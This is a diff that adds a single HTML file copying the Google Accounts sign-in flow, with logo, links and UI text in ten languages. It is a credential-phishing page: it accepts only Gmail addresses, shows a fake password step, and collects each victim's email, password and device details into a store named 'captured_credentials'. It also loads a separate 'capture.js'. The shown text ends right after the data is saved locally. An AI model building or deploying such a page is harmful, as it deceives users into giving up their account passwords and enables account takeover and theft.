@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Google Sans', 'Roboto', 'Segoe UI', Arial, sans-serif;
+            background: #f0f4f9;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #202124;
+        }
+        .container {
+            width: 1000px;
+            min-height: 400px;
+            background: #fff;
+            border-radius: 28px;
+            display: flex;
+            padding: 48px 40px 36px 48px;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        .left-col {
+            flex: 1;
+            padding-right: 40px;
+            display: flex;
+            flex-direction: column;
+        }
+        .right-col {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .logo {
+            margin-bottom: 24px;
+        }
+        .logo svg { height: 40px; width: 40px; }
+        h1 {
+            font-size: 36px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
+        .subtitle {
+            color: #202124;
+            font-size: 16px;
+            margin-bottom: 32px;
+            font-weight: 400;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 8px;
+        }
+        input {
+            width: 100%;
+            height: 54px;
+            padding: 13px 15px;
+            border: 1px solid #747775;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #202124;
+            outline: none;
+            transition: all 0.2s;
+            background: #fff;
+        }
+        input:focus {
+            border: 2px solid #0b57d0;
+            padding: 12px 14px;
+        }
+        input.error {
+            border: 2px solid #d93025;
+            padding: 12px 14px;
+        }
+        .label {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #444746;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s;
+            background: #fff;
+            padding: 0 4px;
+        }
+        input:focus + .label,
+        input:not(:placeholder-shown) + .label {
+            top: 0;
+            font-size: 12px;
+            color: #0b57d0;
+        }
+        input.error + .label { color: #d93025; }
+        input.error:focus + .label { color: #d93025; }
+        .error-msg {
+            color: #d93025;
+            font-size: 12px;
+            margin: 4px 0 16px 0;
+            display: none;
+            align-items: center;
+            gap: 6px;
+        }
+        .error-msg.show { display: flex; }
+        .forgot {
+            color: #0b57d0;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin: 8px 0 40px 0;
+            display: inline-block;
+            border-radius: 4px;
+            padding: 4px;
+            margin-left: -4px;
+            width: fit-content;
+        }
+        .forgot:hover { background: rgba(11,87,208,0.04); }
+        .guest {
+            color: #444746;
+            font-size: 14px;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+        .guest a {
+            color: #0b57d0;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .guest a:hover { text-decoration: underline; }
+        .bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .create-dropdown {
+            position: relative;
+        }
+        .create-btn {
+            color: #0b57d0;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            border: none;
+            background: none;
+            padding: 8px 8px 8px 0;
+            border-radius: 4px;
+        }
+        .create-btn:hover { background: rgba(11,87,208,0.04); }
+        .create-menu {
+            display: none;
+            position: absolute;
+            bottom: 100%;
+            left: 0;
+            background: #fff;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            padding: 8px 0;
+            min-width: 240px;
+            z-index: 10;
+            margin-bottom: 4px;
+        }
+        .create-menu.show { display: block; }
+        .create-menu a {
+            display: block;
+            padding: 12px 16px;
+            color: #202124;
+            font-size: 14px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .create-menu a:hover { background: #f1f3f4; }
+        .next {
+            background: #0b57d0;
+            color: #fff;
+            border: none;
+            border-radius: 20px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            min-width: 80px;
+            transition: background 0.2s;
+        }
+        .next:hover { background: #0842a0; }
+        .next:disabled { background: #dadce0; color: #5f6368; cursor: default; }
+        .footer {
+            margin-top: 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #1f1f1f;
+            width: 1000px;
+            padding: 0 24px;
+        }
+        .footer span { cursor: pointer; padding: 4px; border-radius: 4px; }
+        .footer span:hover { color: #202124; background: rgba(32,33,36,0.04); }
+        .lang-select {
+            border: none;
+            background: none;
+            color: #1f1f1f;
+            font-size: 12px;
+            cursor: pointer;
+            padding: 4px;
+            border-radius: 4px;
+        }
+        .lang-select:hover { background: rgba(32,33,36,0.04); }
+        .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #fff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        .spinner.show { display: inline-block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(240,244,249,0.9);
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+        .loading-overlay.show { display: flex; }
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #dadce0;
+            border-top-color: #0b57d0;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        .welcome-container {
+            display: none;
+            width: 1000px;
+            min-height: 400px;
+            background: #fff;
+            border-radius: 28px;
+            padding: 48px 40px 36px 48px;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        .welcome-container.show { display: flex; }
+        .welcome-left {
+            flex: 1;
+            padding-right: 40px;
+            display: flex;
+            flex-direction: column;
+        }
+        .welcome-right {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .welcome-logo { margin-bottom: 24px; }
+        .welcome-logo svg { height: 40px; width: 40px; }
+        .welcome-title {
+            font-size: 36px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 16px;
+            letter-spacing: -0.5px;
+        }
+        .email-chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 20px;
+            font-size: 14px;
+            color: #202124;
+            margin-bottom: 24px;
+            cursor: pointer;
+            background: #fff;
+            width: fit-content;
+        }
+        .email-chip:hover { background: #f8f9fa; }
+        .email-chip svg { width: 20px; height: 20px; fill: #5f6368; }
+        .email-chip .arrow { font-size: 12px; color: #5f6368; }
+        .verify-text { font-size: 16px; color: #202124; margin-bottom: 32px; }
+        .welcome-input-group { position: relative; margin-bottom: 8px; width: 100%; }
+        .welcome-input {
+            width: 100%;
+            height: 56px;
+            padding: 16px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #202124;
+            outline: none;
+            transition: all 0.2s;
+            background: #fff;
+        }
+        .welcome-input:focus { border: 2px solid #1a73e8; padding: 15px 14px; }
+        .welcome-input.error { border: 2px solid #d93025; padding: 15px 14px; }
+        .welcome-label {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #5f6368;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s;
+            background: #fff;
+            padding: 0 4px;
+        }
+        .welcome-input:focus + .welcome-label,
+        .welcome-input:not(:placeholder-shown) + .welcome-label { top: 0; font-size: 12px; color: #1a73e8; }
+        .welcome-input.error + .welcome-label { color: #d93025; }
+        .welcome-input.error:focus + .welcome-label { color: #d93025; }
+        .welcome-show {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 12px 0 40px 0;
+            font-size: 14px;
+            color: #202124;
+            width: 100%;
+        }
+        .welcome-show input { width: 18px; height: 18px; border: 2px solid #5f6368; border-radius: 2px; accent-color: #1a73e8; cursor: pointer; }
+        .welcome-show label { cursor: pointer; }
+        .welcome-forgot {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            border: none;
+            background: none;
+            padding: 8px 8px 8px 0;
+            border-radius: 4px;
+        }
+        .welcome-forgot:hover { background: rgba(26,115,232,0.04); }
+        .welcome-next {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 20px;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            min-width: 80px;
+            transition: background 0.2s;
+        }
+        .welcome-next:hover { background: #174ea6; }
+        .welcome-next:disabled { background: #dadce0; color: #5f6368; cursor: default; }
+        @media (max-width: 1050px) {
+            .container, .welcome-container { width: 90%; max-width: 500px; flex-direction: column; padding: 48px 40px 36px; }
+            .left-col, .welcome-left { padding-right: 0; margin-bottom: 24px; }
+            .footer { width: 90%; max-width: 500px; }
+        }
+        @media (max-width: 480px) {
+            .container, .welcome-container { width: 100%; border-radius: 0; padding: 24px 20px; box-shadow: none; }
+            .footer { width: 100%; padding: 0 20px; }
+            body { background: #fff; }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+    </div>
+    <div class="container" id="signinPage">
+        <div class="left-col">
+            <div class="logo">
+                <svg viewBox="0 0 48 48" width="40" height="40" xmlns="http://www.w3.org/2000/svg">
+                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                </svg>
+            </div>
+            <h1>Sign in</h1>
+            <p class="subtitle">Use your Google Account</p>
+        </div>
+        <div class="right-col">
+            <form id="loginForm" onsubmit="return handleSignin(event)">
+                <div class="input-group">
+                    <input type="text" id="email" name="email" placeholder=" " autocomplete="email" autocapitalize="none" oninput="clearSigninError()">
+                    <label class="label" for="email">Email or phone</label>
+                </div>
+                <div class="error-msg" id="emailError">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                    <span id="emailErrorText">Enter an email or phone number</span>
+                </div>
+                <div class="forgot" onclick="window.location.href='https://accounts.google.com/signin/v2/usernamerecovery'">Forgot email?</div>
+                <div class="guest">
+                    Not your computer? Use Guest mode to sign in privately. 
+                    <a href="https://support.google.com/accounts/answer/7395990" target="_blank">Learn more about using Guest mode</a>
+                </div>
+                <div class="bottom">
+                    <div class="create-dropdown">
+                        <button type="button" class="create-btn" onclick="toggleCreateMenu()">Create account</button>
+                        <div class="create-menu" id="createMenu">
+                            <a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp" target="_blank">For my personal use</a>
+                            <a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp&hl=en&biz=true" target="_blank">For my child</a>
+                            <a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp&hl=en&biz=true" target="_blank">For work or my business</a>
+                        </div>
+                    </div>
+                    <button type="submit" class="next" id="nextBtn">
+                        <span id="btnText">Next</span>
+                        <div class="spinner" id="btnSpinner"></div>
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="welcome-container" id="welcomePage">
+        <div class="welcome-left">
+            <div class="welcome-logo">
+                <svg viewBox="0 0 48 48" width="40" height="40" xmlns="http://www.w3.org/2000/svg">
+                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                </svg>
+            </div>
+            <h1 class="welcome-title">Welcome</h1>
+            <div class="email-chip" id="emailChip" onclick="goBack()">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                </svg>
+                <span id="emailDisplay">user@example.com</span>
+                <span class="arrow">&#9662;</span>
+            </div>
+            <p class="verify-text">To continue, first verify it's you</p>
+        </div>
+        <div class="welcome-right">
+            <form id="welcomeForm" onsubmit="return handleWelcome(event)">
+                <div class="welcome-input-group">
+                    <input type="password" id="password" name="password" class="welcome-input" placeholder=" " autocomplete="current-password" oninput="clearWelcomeError()">
+                    <label class="welcome-label" for="password">Enter your password</label>
+                </div>
+                <div class="error-msg" id="passwordError">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                    <span id="passwordErrorText">Wrong password. Try again or click 'Forgot password' to reset it.</span>
+                </div>
+                <div class="welcome-show">
+                    <input type="checkbox" id="showPass" onchange="togglePassword()">
+                    <label for="showPass">Show password</label>
+                </div>
+                <div class="bottom">
+                    <button type="button" class="welcome-forgot" onclick="showForgotPass()">Forgot password?</button>
+                    <button type="submit" class="welcome-next" id="welcomeNextBtn">
+                        <span id="welcomeBtnText">Next</span>
+                        <div class="spinner" id="welcomeBtnSpinner"></div>
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="footer" id="pageFooter">
+        <select class="lang-select" id="langSelect" onchange="changeLanguage()">
+            <option value="en">English (United States)</option>
+            <option value="en-GB">English (United Kingdom)</option>
+            <option value="es">Español</option>
+            <option value="fr">Français</option>
+            <option value="de">Deutsch</option>
+            <option value="it">Italiano</option>
+            <option value="pt">Português</option>
+            <option value="zh">中文 (简体)</option>
+            <option value="ja">日本語</option>
+            <option value="ko">한국어</option>
+        </select>
+        <div>
+            <span onclick="window.open('https://support.google.com/accounts','_blank')">Help</span>
+            <span onclick="window.open('https://policies.google.com/privacy','_blank')">Privacy</span>
+            <span onclick="window.open('https://policies.google.com/terms','_blank')">Terms</span>
+        </div>
+    </div>
+    <script src="capture.js"></script>
+    <script>
+        const STORAGE_KEY = 'captured_credentials';
+        let currentEmail = '';
+        let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 480;
+
+        const translations = {
+            en: {
+                signinTitle: 'Sign in', signinSubtitle: 'Use your Google Account', emailLabel: 'Email or phone',
+                emailError: 'Enter an email or phone number', emailErrorGmail: 'Please enter a valid Gmail address',
+                forgotEmail: 'Forgot email?', guestText: 'Not your computer? Use Guest mode to sign in privately.',
+                guestLink: 'Learn more about using Guest mode', createAccount: 'Create account',
+                createPersonal: 'For my personal use', createChild: 'For my child', createWork: 'For work or my business',
+                next: 'Next', welcomeTitle: 'Welcome', verifyText: 'To continue, first verify it\'s you',
+                passwordLabel: 'Enter your password', passwordError: 'Wrong password. Try again or click \'Forgot password\' to reset it.',
+                showPassword: 'Show password', forgotPassword: 'Forgot password?', help: 'Help', privacy: 'Privacy', terms: 'Terms'
+            },
+            'en-GB': {
+                signinTitle: 'Sign in', signinSubtitle: 'Use your Google Account', emailLabel: 'Email or phone',
+                emailError: 'Enter an email or phone number', emailErrorGmail: 'Please enter a valid Gmail address',
+                forgotEmail: 'Forgot email?', guestText: 'Not your computer? Use Guest mode to sign in privately.',
+                guestLink: 'Learn more about using Guest mode', createAccount: 'Create account',
+                createPersonal: 'For my personal use', createChild: 'For my child', createWork: 'For work or my business',
+                next: 'Next', welcomeTitle: 'Welcome', verifyText: 'To continue, first verify it\'s you',
+                passwordLabel: 'Enter your password', passwordError: 'Wrong password. Try again or click \'Forgot password\' to reset it.',
+                showPassword: 'Show password', forgotPassword: 'Forgot password?', help: 'Help', privacy: 'Privacy', terms: 'Terms'
+            },
+            es: {
+                signinTitle: 'Iniciar sesión', signinSubtitle: 'Usa tu cuenta de Google', emailLabel: 'Correo electrónico o teléfono',
+                emailError: 'Introduce un correo electrónico o número de teléfono', emailErrorGmail: 'Introduce una dirección de Gmail válida',
+                forgotEmail: '¿Has olvidado el correo electrónico?', guestText: '¿No es tu ordenador? Usa el modo de invitado para iniciar sesión de forma privada.',
+                guestLink: 'Más información sobre el modo de invitado', createAccount: 'Crear cuenta',
+                createPersonal: 'Para uso personal', createChild: 'Para mi hijo', createWork: 'Para el trabajo o mi empresa',
+                next: 'Siguiente', welcomeTitle: 'Te damos la bienvenida', verifyText: 'Para continuar, primero verifica que eres tú',
+                passwordLabel: 'Introduce tu contraseña', passwordError: 'Contraseña incorrecta. Vuelve a intentarlo o haz clic en "¿Has olvidado la contraseña?" para restablecerla.',
+                showPassword: 'Mostrar contraseña', forgotPassword: '¿Has olvidado la contraseña?', help: 'Ayuda', privacy: 'Privacidad', terms: 'Términos'
+            },
+            fr: {
+                signinTitle: 'Connexion', signinSubtitle: 'Utilisez votre compte Google', emailLabel: 'Adresse e-mail ou numéro de téléphone',
+                emailError: 'Saisissez une adresse e-mail ou un numéro de téléphone', emailErrorGmail: 'Veuillez saisir une adresse Gmail valide',
+                forgotEmail: 'Adresse e-mail oubliée ?', guestText: 'Ce n\'est pas votre ordinateur ? Utilisez le mode Invité pour vous connecter en privé.',
+                guestLink: 'En savoir plus sur le mode Invité', createAccount: 'Créer un compte',
+                createPersonal: 'Pour mon usage personnel', createChild: 'Pour mon enfant', createWork: 'Pour le travail ou mon entreprise',
+                next: 'Suivant', welcomeTitle: 'Bienvenue', verifyText: 'Pour continuer, vérifiez d\'abord qu\'il s\'agit bien de vous',
+                passwordLabel: 'Saisissez votre mot de passe', passwordError: 'Mot de passe incorrect. Réessayez ou cliquez sur "Mot de passe oublié" pour le réinitialiser.',
+                showPassword: 'Afficher le mot de passe', forgotPassword: 'Mot de passe oublié ?', help: 'Aide', privacy: 'Confidentialité', terms: 'Conditions'
+            },
+            de: {
+                signinTitle: 'Anmelden', signinSubtitle: 'Mit Ihrem Google-Konto anmelden', emailLabel: 'E-Mail oder Telefonnummer',
+                emailError: 'E-Mail-Adresse oder Telefonnummer eingeben', emailErrorGmail: 'Bitte geben Sie eine gültige Gmail-Adresse ein',
+                forgotEmail: 'E-Mail-Adresse vergessen?', guestText: 'Nicht Ihr Computer? Melden Sie sich privat mit dem Gastmodus an.',
+                guestLink: 'Weitere Informationen zum Gastmodus', createAccount: 'Konto erstellen',
+                createPersonal: 'Für den persönlichen Gebrauch', createChild: 'Für mein Kind', createWork: 'Für die Arbeit oder mein Unternehmen',
+                next: 'Weiter', welcomeTitle: 'Willkommen', verifyText: 'Um fortzufahren, bestätigen Sie zuerst, dass Sie es sind',
+                passwordLabel: 'Passwort eingeben', passwordError: 'Falsches Passwort. Versuchen Sie es erneut oder klicken Sie auf "Passwort vergessen", um es zurückzusetzen.',
+                showPassword: 'Passwort anzeigen', forgotPassword: 'Passwort vergessen?', help: 'Hilfe', privacy: 'Datenschutz', terms: 'Nutzungsbedingungen'
+            },
+            it: {
+                signinTitle: 'Accedi', signinSubtitle: 'Usa il tuo Account Google', emailLabel: 'E-mail o numero di telefono',
+                emailError: 'Inserisci un indirizzo email o un numero di telefono', emailErrorGmail: 'Inserisci un indirizzo Gmail valido',
+                forgotEmail: 'Hai dimenticato l\'email?', guestText: 'Non è il tuo computer? Utilizza la modalità ospite per accedere in privato.',
+                guestLink: 'Scopri di più sulla modalità ospite', createAccount: 'Crea account',
+                createPersonal: 'Per uso personale', createChild: 'Per mio figlio', createWork: 'Per lavoro o la mia attività',
+                next: 'Avanti', welcomeTitle: 'Benvenuto', verifyText: 'Per continuare, verifica prima che sei tu',
+                passwordLabel: 'Inserisci la password', passwordError: 'Password errata. Riprova o fai clic su "Hai dimenticato la password?" per reimpostarla.',
+                showPassword: 'Mostra password', forgotPassword: 'Hai dimenticato la password?', help: 'Guida', privacy: 'Privacy', terms: 'Termini'
+            },
+            pt: {
+                signinTitle: 'Fazer login', signinSubtitle: 'Use sua Conta do Google', emailLabel: 'E-mail ou telefone',
+                emailError: 'Digite um e-mail ou número de telefone', emailErrorGmail: 'Digite um endereço do Gmail válido',
+                forgotEmail: 'Esqueceu o e-mail?', guestText: 'Não é o seu computador? Use o modo visitante para fazer login em particular.',
+                guestLink: 'Saiba mais sobre o modo visitante', createAccount: 'Criar conta',
+                createPersonal: 'Para uso pessoal', createChild: 'Para meu filho', createWork: 'Para trabalho ou meu negócio',
+                next: 'Avançar', welcomeTitle: 'Bem-vindo', verifyText: 'Para continuar, primeiro verifique se é você',
+                passwordLabel: 'Digite sua senha', passwordError: 'Senha incorreta. Tente novamente ou clique em "Esqueceu a senha?" para redefini-la.',
+                showPassword: 'Mostrar senha', forgotPassword: 'Esqueceu a senha?', help: 'Ajuda', privacy: 'Privacidade', terms: 'Termos'
+            },
+            zh: {
+                signinTitle: '登录', signinSubtitle: '使用您的 Google 账号', emailLabel: '电子邮件或电话号码',
+                emailError: '请输入电子邮件地址或电话号码', emailErrorGmail: '请输入有效的 Gmail 地址',
+                forgotEmail: '忘记了电子邮件地址？', guestText: '这不是您的计算机？请使用访客模式私密登录。',
+                guestLink: '详细了解如何使用访客模式', createAccount: '创建账号',
+                createPersonal: '供个人使用', createChild: '为我的孩子', createWork: '用于工作或我的企业',
+                next: '下一步', welcomeTitle: '欢迎', verifyText: '要继续操作，请先确认是您本人在操作',
+                passwordLabel: '输入您的密码', passwordError: '密码错误。请重试，或点击"忘记密码？"来重置密码。',
+                showPassword: '显示密码', forgotPassword: '忘记密码？', help: '帮助', privacy: '隐私权', terms: '服务条款'
+            },
+            ja: {
+                signinTitle: 'ログイン', signinSubtitle: 'Google アカウントを使用', emailLabel: 'メールまたは電話番号',
+                emailError: 'メールアドレスまたは電話番号を入力', emailErrorGmail: '有効な Gmail アドレスを入力してください',
+                forgotEmail: 'メールアドレスを忘れた場合', guestText: '自分のコンピュータではありませんか？ゲスト モードを使用してプライベートにログインしてください。',
+                guestLink: 'ゲスト モードの詳細', createAccount: 'アカウントを作成',
+                createPersonal: '個人で使用する', createChild: '子供用', createWork: '仕事またはビジネス用',
+                next: '次へ', welcomeTitle: 'ようこそ', verifyText: '続行するには、まず本人確認を行ってください',
+                passwordLabel: 'パスワードを入力', passwordError: 'パスワードが間違っています。もう一度お試しになるか、[パスワードを忘れた場合] をクリックしてリセットしてください。',
+                showPassword: 'パスワードを表示', forgotPassword: 'パスワードを忘れた場合', help: 'ヘルプ', privacy: 'プライバシー', terms: '利用規約'
+            },
+            ko: {
+                signinTitle: '로그인', signinSubtitle: 'Google 계정 사용', emailLabel: '이메일 또는 휴대전화',
+                emailError: '이메일 또는 휴대전화 번호 입력', emailErrorGmail: '유효한 Gmail 주소를 입력하세요',
+                forgotEmail: '이메일을 잊으셨나요?', guestText: '내 컴퓨터가 아닌가요? 게스트 모드를 사용하여 비공개로 로그인하세요.',
+                guestLink: '게스트 모드 사용에 대해 자세히 알아보기', createAccount: '계정 만들기',
+                createPersonal: '개인용', createChild: '자녀용', createWork: '직장 또는 비즈니스용',
+                next: '다음', welcomeTitle: '환영합니다', verifyText: '계속하려면 먼저 본인인증을 해 주세요',
+                passwordLabel: '비밀번호 입력', passwordError: '비밀번호가 잘못되었습니다. 다시 시도하거나 \'비밀번호를 잊으셨나요?\'를 클릭하여 재설정하세요.',
+                showPassword: '비밀번호 표시', forgotPassword: '비밀번호를 잊으셨나요?', help: '고객센터', privacy: '개인정보 보호', terms: '약관'
+            }
+        };
+
+        function toggleCreateMenu() {
+            const menu = document.getElementById('createMenu');
+            menu.classList.toggle('show');
+        }
+        document.addEventListener('click', function(e) {
+            const dropdown = document.querySelector('.create-dropdown');
+            if (!dropdown.contains(e.target)) {
+                document.getElementById('createMenu').classList.remove('show');
+            }
+        });
+
+        function changeLanguage() {
+            const lang = document.getElementById('langSelect').value;
+            const t = translations[lang] || translations.en;
+            document.querySelector('#signinPage h1').textContent = t.signinTitle;
+            document.querySelector('#signinPage .subtitle').textContent = t.signinSubtitle;
+            document.querySelector('label[for="email"]').textContent = t.emailLabel;
+            document.getElementById('emailErrorText').textContent = t.emailError;
+            document.querySelector('.forgot').textContent = t.forgotEmail;
+            document.querySelector('.guest').childNodes[0].textContent = t.guestText + ' ';
+            document.querySelector('.guest a').textContent = t.guestLink;
+            document.querySelector('.create-btn').textContent = t.createAccount;
+            document.querySelectorAll('.create-menu a')[0].textContent = t.createPersonal;
+            document.querySelectorAll('.create-menu a')[1].textContent = t.createChild;
+            document.querySelectorAll('.create-menu a')[2].textContent = t.createWork;
+            document.getElementById('btnText').textContent = t.next;
+            document.querySelector('.welcome-title').textContent = t.welcomeTitle;
+            document.querySelector('.verify-text').textContent = t.verifyText;
+            document.querySelector('.welcome-label').textContent = t.passwordLabel;
+            document.getElementById('passwordErrorText').textContent = t.passwordError;
+            document.querySelector('.welcome-show label').textContent = t.showPassword;
+            document.querySelector('.welcome-forgot').textContent = t.forgotPassword;
+            document.getElementById('welcomeBtnText').textContent = t.next;
+            document.querySelectorAll('.footer span')[0].textContent = t.help;
+            document.querySelectorAll('.footer span')[1].textContent = t.privacy;
+            document.querySelectorAll('.footer span')[2].textContent = t.terms;
+        }
+
+        function clearSigninError() {
+            document.getElementById('email').classList.remove('error');
+            document.getElementById('emailError').classList.remove('show');
+        }
+        function showSigninError(msg) {
+            document.getElementById('email').classList.add('error');
+            document.getElementById('emailError').classList.add('show');
+            if (msg) document.getElementById('emailErrorText').textContent = msg;
+        }
+        function handleSignin(e) {
+            e.preventDefault();
+            clearSigninError();
+            const email = document.getElementById('email').value.trim();
+            const lang = document.getElementById('langSelect').value;
+            const t = translations[lang] || translations.en;
+            if (!email) { showSigninError(t.emailError); return false; }
+            if (!email.endsWith('@gmail.com')) { showSigninError(t.emailErrorGmail); return false; }
+            currentEmail = email;
+            const btn = document.getElementById('nextBtn');
+            const spinner = document.getElementById('btnSpinner');
+            const btnText = document.getElementById('btnText');
+            btn.disabled = true;
+            spinner.classList.add('show');
+            btnText.style.display = 'none';
+            setTimeout(() => { showWelcome(email); }, 1500);
+            return false;
+        }
+        function showWelcome(email) {
+            document.getElementById('signinPage').style.display = 'none';
+            document.getElementById('welcomePage').classList.add('show');
+            document.getElementById('emailDisplay').textContent = email;
+            document.getElementById('password').focus();
+        }
+        function goBack() {
+            document.getElementById('welcomePage').classList.remove('show');
+            document.getElementById('signinPage').style.display = 'flex';
+            document.getElementById('email').focus();
+            document.getElementById('nextBtn').disabled = false;
+            document.getElementById('btnSpinner').classList.remove('show');
+            document.getElementById('btnText').style.display = 'inline';
+        }
+        function clearWelcomeError() {
+            document.getElementById('password').classList.remove('error');
+            document.getElementById('passwordError').classList.remove('show');
+        }
+        function showWelcomeError() {
+            document.getElementById('password').classList.add('error');
+            document.getElementById('passwordError').classList.add('show');
+        }
+        function togglePassword() {
+            const pass = document.getElementById('password');
+            pass.type = document.getElementById('showPass').checked ? 'text' : 'password';
+        }
+        function handleWelcome(e) {
+            e.preventDefault();
+            clearWelcomeError();
+            const password = document.getElementById('password').value;
+            if (!password) { showWelcomeError(); return false; }
+            const btn = document.getElementById('welcomeNextBtn');
+            const spinner = document.getElementById('welcomeBtnSpinner');
+            const btnText = document.getElementById('welcomeBtnText');
+            const overlay = document.getElementById('loadingOverlay');
+            btn.disabled = true;
+            spinner.classList.add('show');
+            btnText.style.display = 'none';
+            overlay.classList.add('show');
+            const data = {
+                email: currentEmail,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                referrer: document.referrer || 'direct',
+                url: window.location.href,
+                device: isMobile ? 'mobile' : 'desktop'
+            };
+            let stored = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+            stored.push(data);
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(stored));
